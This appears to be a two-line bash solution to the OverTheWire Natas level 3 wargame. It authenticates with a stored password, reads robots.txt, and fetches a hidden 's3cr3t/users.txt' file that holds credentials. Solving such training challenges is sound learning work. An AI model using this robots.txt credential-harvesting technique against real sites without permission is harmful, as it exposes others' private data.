#!/bin/bash

curl -u natas3:$(cat keys/tres) http://natas3.natas.labs.overthewire.org/robots.txt 2>/dev/null 

curl -u natas3:$(cat keys/tres) http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt 2>/dev/null 
